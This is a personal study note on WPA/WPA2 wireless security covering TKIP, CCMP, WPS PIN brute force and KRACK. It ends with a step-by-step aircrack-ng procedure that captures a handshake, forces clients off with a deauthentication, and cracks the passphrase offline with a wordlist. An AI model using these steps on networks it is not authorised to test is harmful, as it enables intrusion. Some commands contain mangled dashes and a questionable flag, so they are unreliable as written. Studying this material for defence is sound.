
2025-04-24

Tags: [[Security]] [[Networking]] [[Applied Cybersecurity]] [[tool]]
# Wireless Network Cracking (WPA & WPA2)

WPA, or Wireless Protected Access is a wireless communication protocol that is much more secure than a protocol like WEP.

**WPA** uses the ```TKIP``` encryption and MIC (provides stronger Integrity than the ```CRC``` used in WEP) -> flaw in ```TKIP``` (retrieve the key stream from short packets to use for re-injection and spoofing)

**WPA2** uses ```CCMP``` ([[Advanced Encryption Standard (AES)|AES]] based encryption mechanism) and MIC (message integrity check)
### Modes and Vulnerabilities
**WPA Personal:**
Also known as WPA-PSK or WPA2-PSK it's designed for home and small office networks and it doesn't require an authentication server. Each wireless network device authenticates with the access point using the same 256-bit key generated from a password or passphrase. Not requiring an authentication server is convenient but this means that it is vulnerable to offline password cracking.

**WPA-Enterprise or WPA2-Enterprise**
This version is designed for, well, enterprises and it requires the use of a RADIUS authentication server.

**Wifi Protected Setup (WPS)** 
Alternative authentication key distribution method intended to simplify and strengthen
the process, but at the initial release it had a major security hole. The major issue was that it was subject to a PIN based offline brute force attack. This could work since it only used an 8 digit numeric code (10^8 -> 100,000,000 combinations), however it's worse since it's split into a 4 digit and a three digit section (and a checksum bit). This means there is actually only 11,000 possible combinations. This is made even worse since the pin is hard coded in, though as a small saving grace it does take a while to get the pin. Doing an attack does also run the risk of crashing the wifi network, which will likely alert someone to start looking into things.

**Key Reinstallation Attacks**
Also known as KRACKs, all versions of WPA and WPA 2 are vulnerable. There are several different versions of how this attack works but the short of it is that you can trick it into reinstalling a key that is all zeros. This attack is fairly complex, although I am certain you can find script-kiddy friendly versions, and like the WPS attacks it can crash the wifi network.

## Performing a password crack
open a root terminal since otherwise this will suck

1. ```airmon-ng```, view the wireless interface
2. ```airmon-ng start wlan0``` put the wireless interface in monitor mode
3. ```airmon-ng check kill``` kill any running processes that may interfere with sniffing
4. ```airodump-ng wlan0mon``` capture packets of raw frames
5. once you find the target stop dumping
6. ```airodump-ng –c stored_channel –w wpa2traffic --bssid stored_bssid --ivs wlan0mon``` 
7. ```aireplay-ng -0 1 --ignore-negative-one –e CyberDefense wlan0mon``` this forces a WPA handshake, although at least one machine has to be on the host network. if it worked for the command running in the previous step then we can stop it.
8. ```aircrack-ng –w /usr/share/wordlists/rockyou.txt wpa2traffic-01.ivs``` now we can just crack the password locally

# References
[[Basic Networking Terminology]]

[[Wireless Network Cracking (WEP)]]

[[WPA 3]]